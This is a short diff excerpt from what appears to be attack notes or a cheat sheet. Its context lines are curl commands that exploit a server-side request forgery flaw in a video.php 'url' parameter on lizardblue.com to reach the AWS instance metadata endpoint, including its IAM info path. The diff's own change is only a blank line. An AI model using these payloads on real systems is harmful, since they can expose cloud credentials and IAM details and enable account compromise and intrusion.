@@ -11,3 +11,4 @@ curl http://169.254.169.254/latest/meta-data/ # Target SSRF request
 curl http://lizardblue.com/video.php?url=http://169.254.169.254/latest/meta-data/ # Leveraging SSRF to get AWS metadata
 
 curl http://lizardblue.com/video.php?url=http://169.254.169.254/latest/meta-data/iam/info # Leveraging SSRF to get AWS metadata
+
